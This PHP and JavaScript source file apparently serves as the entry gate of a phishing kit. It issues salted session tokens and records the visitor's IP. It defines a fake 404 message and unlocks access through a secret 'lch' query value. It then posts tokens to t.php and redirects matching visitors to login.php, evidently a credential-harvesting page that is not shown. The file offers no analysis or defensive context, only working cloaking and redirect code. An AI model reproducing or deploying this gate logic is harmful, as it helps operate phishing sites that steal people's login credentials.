<?php
session_start();
session_destroy();
session_start();
require 'api.php';
$localh = '1fa77417ebc';
$err_msg = "<h1>404 Not Found</h1>The page that you have requested could not be found.";
$thesalt = ")PQNV(";
$thesalt2 = ")PQNV(RXO2M_Y=)P|";
  $lchvg = '-';
	  if(isset($_GET['lch']) && $_GET['lch'] == $localh){
        $lchvg = $localh;
	  }
$ip = get_client_ip();
	
//if(!isset($_SESSION['evdd'])){
  $cookie_name = rand_alph();
  $get_md5_rand = get_md5_rand();
  $cookie_val = md5($get_md5_rand.$thesalt);
  $_SESSION['evdd'] = array(
            'refr' => rand_alph(10),
            'refresh'=>0,'t.php'=>'a', 'ip'=>$ip, 'idmd5'=>$get_md5_rand, 
            'idmd5t'=>md5($get_md5_rand), 't'=>time(), 'cn'=>'gg', 
            'cv'=>$cookie_val, 'nm'=>1
        );	
//}
$cookie_par = '';
if(isset($_SESSION['evdd'])){
  $cookie_par = 'setCookie('."'".$_SESSION['evdd']['cn']."','".$_SESSION['evdd']['cv']."','1'".');';
}
if(empty($_GET['email'])){
    //echo "<script>window.location = 'login.php';</script>";
    //exit();
}

  
function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function rand_alph($len=5){
  $a = 'abcdefghijkmnopqrstuvwxyz';
  $a .= $a;$a .= $a;$a .= $a;
  return substr(str_shuffle($a), 0, $len);
}
function get_md5_rand(){
  $a = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
  $a .= $a;$a .= $a;$a .= $a;
  $a = str_shuffle($a).md5(str_shuffle($a));
  
  return md5($a);
}
function get_mdf_salt_cv($thesalt){
  return md5($_SESSION['evdd']['cv'].$thesalt);	
}
?>


<!DOCTYPE html>
<html>
<head>
<title></title>
</head>
<body>
<div class="df"></div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
  $(document).ready(function(){
	var alpn = '123456789abcdefghijklmnopqrstuvwxyz';
	var num = '123456789';
	var alp = 'abcdefghijklmnopqrstuvwxyz';
	var rString = randomString(32, alp); 
    
    <?php //echo $cookie_par; ?>
	//alert(rString);
	/*  */
    $.ajax({
          url: 't.php', 
          type: 'POST', 
          dataType: 'html', 
          data: { 
		     lch : <?php echo "'".$lchvg."'"; ?>, 
			 r : rString, k : <?php echo "'".get_mdf_salt_cv($thesalt)."'"; ?>, 
			 s : <?php echo "'".$_SESSION['evdd']['idmd5t']."'"; ?> 
		  }, 
		  crossDomain: true,
          success: function(msg) { 
	        if(msg == <?php echo "'".$_SESSION['evdd']['idmd5t']."'"; ?>){
			  window.location.replace('login.php');	
			}
		  },
          error: function(e) {
            console.log(e)
          }
        });
		/*  */
  });
  function randomString(length, chars) {
    var result = '';
    for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
    return result;
}
function setCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}
function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
function eraseCookie(name) {   
    document.cookie = name+'=; Max-Age=-99999999;';  
}
</script>
</body>
</html>